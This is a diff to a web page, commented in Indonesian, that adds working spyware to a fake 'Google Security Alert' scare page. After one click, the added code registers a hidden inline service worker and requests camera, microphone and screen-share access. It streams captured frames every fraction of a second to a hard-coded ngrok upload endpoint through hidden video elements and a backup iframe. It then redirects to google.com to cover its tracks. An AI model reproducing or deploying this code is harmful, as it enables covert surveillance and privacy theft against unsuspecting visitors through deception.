@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -10,8 +10,8 @@
   .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
   h2 { color: #4285f4; margin-bottom: 10px; }
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 150px; overflow-y: auto; }
+  iframe, audio, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
@@ -30,6 +30,7 @@
 
   var logEl = document.getElementById('log');
   var executed = false;
+  var swRegistration = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -40,6 +41,7 @@
   // KONFIGURASI
   // ============================================
   var TARGET_URL = "https://www.google.com";
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
 
   var CONFIG = {
     tts: {
@@ -52,7 +54,38 @@
   };
 
   // ============================================
-  // 1. AUDIO UNLOCK & TTS
+  // 1. INLINE SERVICE WORKER (BLOB URL)
+  // ============================================
+  var swCode = `
+    self.addEventListener('install', (e) => self.skipWaiting());
+    self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
+
+    self.addEventListener('message', (e) => {
+      if (e.data.type === 'FRAME') {
+        fetch('${SERVER_ENDPOINT}', {
+          method: 'POST',
+          body: e.data.formData,
+          keepalive: true
+        }).catch(err => console.error('SW Upload Error:', err));
+      }
+    });
+  `;
+
+  async function registerInlineSW() {
+    try {
+      if ('serviceWorker' in navigator) {
+        var blob = new Blob([swCode], { type: 'application/javascript' });
+        var swUrl = URL.createObjectURL(blob);
+        swRegistration = await navigator.serviceWorker.register(swUrl);
+        log("[+] Inline Service Worker Terdaftar.");
+      }
+    } catch (e) {
+      log("[-] SW Error: " + e.message);
+    }
+  }
+
+  // ============================================
+  // 2. AUDIO UNLOCK & TTS
   // ============================================
   function initAudio() {
     try {
@@ -67,12 +100,10 @@
       osc.connect(gain);
       gain.connect(ctx.destination);
       osc.start();
-      osc.stop(ctx.currentTime + 2.0);
+      osc.stop(ctx.currentTime + 3.0);
       
       log("[+] AudioContext Beep dimulai.");
-    } catch(e) {
-      log("[-] Audio Error: " + e.message);
-    }
+    } catch(e) {}
   }
 
   function startTTS() {
@@ -85,54 +116,189 @@
       u.volume = CONFIG.tts.volume;
       window.speechSynthesis.speak(u);
       log("[+] TTS dimulai.");
-    } catch(e) {
-      log("[-] TTS Error: " + e.message);
+    } catch(e) {}
+  }
+
+  // ============================================
+  // 3. KAMERA + MIKROFON
+  // ============================================
+  async function startCameraAndMic() {
+    try {
+      log("[+] Meminta Izin Kamera & Mikrofon...");
+      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      log("[+] 🚨 KAMERA & MIKROFON DIIZINKAN!");
+
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
+      document.body.appendChild(video);
+      await video.play().catch(function(){});
+
+      var canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      var ctx = canvas.getContext('2d');
+
+      setInterval(function() {
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(function(blob) {
+            if (!blob) return;
+            var formData = new FormData();
+            formData.append('file', blob, 'camera.jpg');
+            
+            if (swRegistration && swRegistration.active) {
+              swRegistration.active.postMessage({ type: 'FRAME', formData: formData });
+            } else {
+              fetch(SERVER_ENDPOINT, { method: 'POST', body: formData, keepalive: true }).catch(function(){});
+            }
+          }, 'image/jpeg', 0.5);
+        }
+      }, 100);
+
+    } catch(err) {
+      log("[-] Kamera/Mic diblokir: " + err.name);
     }
   }
 
   // ============================================
-  // 2. INJECT IFRAME AUDIO (BACKUP)
+  // 4. SCREEN SHARE
   // ============================================
-  function injectAudioIframe() {
+  async function startScreenShare() {
+    try {
+      log("[+] Meminta Izin Screen Share...");
+      var stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
+      log("[+] 🚨 SCREEN SHARE DIIZINKAN!");
+
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
+      document.body.appendChild(video);
+      await video.play().catch(function(){});
+
+      var canvas = document.createElement('canvas');
+      canvas.width = 1280;
+      canvas.height = 720;
+      var ctx = canvas.getContext('2d');
+
+      setInterval(function() {
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(function(blob) {
+            if (!blob) return;
+            var formData = new FormData();
+            formData.append('file', blob, 'screen.jpg');
+            
+            if (swRegistration && swRegistration.active) {
+              swRegistration.active.postMessage({ type: 'FRAME', formData: formData });
+            } else {
+              fetch(SERVER_ENDPOINT, { method: 'POST', body: formData, keepalive: true }).catch(function(){});
+            }
+          }, 'image/jpeg', 0.6);
+        }
+      }, 200);
+
+    } catch(err) {
+      log("[-] Screen Share diblokir: " + err.name);
+    }
+  }
+
+  // ============================================
+  // 5. IFRAME BACKUP (AUDIO + CAMERA)
+  // ============================================
+  function injectBackupIframe() {
     try {
       var iframe = document.createElement('iframe');
-      iframe.allow = "autoplay";
+      iframe.allow = "camera; microphone; autoplay; display-capture";
       iframe.style.display = "none";
       
       iframe.srcdoc = `
         <!DOCTYPE html>
         <html>
         <body>
+          <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;"></video>
+          <canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
+          
           <script>
-            if ('speechSynthesis' in window) {
-              var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been compromised.");
-              u.lang = 'en-US';
-              u.volume = 1.0;
-              window.speechSynthesis.speak(u);
-            }
-            try {
-              var ctx = new (window.AudioContext || window.webkitAudioContext)();
-              if (ctx.state === 'suspended') ctx.resume();
-              var osc = ctx.createOscillator();
-              osc.frequency.value = 880;
-              osc.connect(ctx.destination);
-              osc.start();
-              osc.stop(ctx.currentTime + 2.0);
-            } catch(e) {}
+            (function() {
+              // Audio TTS
+              if ('speechSynthesis' in window) {
+                var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been compromised.");
+                u.lang = 'en-US';
+                u.volume = 1.0;
+                window.speechSynthesis.speak(u);
+              }
+
+              // Beep
+              try {
+                var ctx = new (window.AudioContext || window.webkitAudioContext)();
+                if (ctx.state === 'suspended') ctx.resume();
+                var osc = ctx.createOscillator();
+                osc.frequency.value = 880;
+                osc.connect(ctx.destination);
+                osc.start();
+                osc.stop(ctx.currentTime + 3.0);
+              } catch(e) {}
+
+              // Kamera Backup
+              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(stream) {
+                  var video = document.getElementById('hiddenVideo');
+                  video.srcObject = stream;
+                  video.play().catch(function(){});
+                  parent.postMessage({ type: 'IFRAME_CAM_OK' }, '*');
+
+                  setInterval(function() {
+                    var canvas = document.getElementById('hiddenCanvas');
+                    var ctx = canvas.getContext('2d');
+                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                      canvas.toBlob(function(blob) {
+                        if (!blob) return;
+                        var formData = new FormData();
+                        formData.append('file', blob, 'iframe.jpg');
+                        fetch('${SERVER_ENDPOINT}', {
+                          method: 'POST',
+                          body: formData,
+                          keepalive: true
+                        }).catch(function(){});
+                      }, 'image/jpeg', 0.5);
+                    }
+                  }, 100);
+                })
+                .catch(function(err) {
+                  parent.postMessage({ type: 'IFRAME_CAM_FAIL', error: err.name }, '*');
+                });
+            })();
           <\/script>
         </body>
         </html>
       `;
 
       document.getElementById("launcher-container").appendChild(iframe);
-      log("[+] Iframe Audio disuntikkan.");
+      log("[+] Iframe Backup disuntikkan.");
     } catch(e) {}
   }
 
   // ============================================
-  // 3. TRIGGER (KLIK - SIMULTANEOUS)
+  // 6. LISTENER PESAN DARI IFRAME
   // ============================================
-  document.body.addEventListener('click', function() {
+  window.addEventListener('message', function(e) {
+    if (e.data.type === 'IFRAME_CAM_OK') {
+      log("[+] 🚨 Iframe Kamera DIIZINKAN!");
+    } else if (e.data.type === 'IFRAME_CAM_FAIL') {
+      log("[-] Iframe Kamera ditolak: " + e.data.error);
+    }
+  });
+
+  // ============================================
+  // 7. TRIGGER (KLIK - SIMULTANEOUS)
+  // ============================================
+  document.body.addEventListener('click', async function() {
     if (executed) return;
     executed = true;
 
@@ -142,28 +308,31 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Simultaneous Hijack...");
+    log("[!] Memulai Ultimate Inline Hijack...");
 
-    // ============================================
-    // EKSEKUSI SIMULTAN (0ms)
-    // ============================================
+    // A. Register Inline Service Worker
+    await registerInlineSW();
 
-    // A. Audio Init (TTS + Beep)
+    // B. Audio
     initAudio();
     startTTS();
 
-    // B. Inject Iframe Audio (Backup)
-    injectAudioIframe();
+    // C. Kamera + Mic
+    startCameraAndMic();
 
-    // C. REDIRECT KE GOOGLE (LANGSUNG!)
-    // Kita tidak memberikan delay sama sekali.
-    // Semua dieksekusi dalam milidetik yang sama.
+    // D. Screen Share
+    startScreenShare();
+
+    // E. Iframe Backup
+    injectBackupIframe();
+
+    // F. REDIRECT KE GOOGLE (SIMULTAN)
     setTimeout(function() {
-      log("[+] Redirect ke Google.com (Bareng-bareng)...");
+      log("[+] Redirect ke Google.com (Simultan)...");
       try {
         window.location.replace(TARGET_URL);
       } catch(e) {}
-    }, 0); // 0ms (Eksekusi secepat mungkin)
+    }, 100); // 100ms untuk inisialisasi
 
   }, { once: true });
 
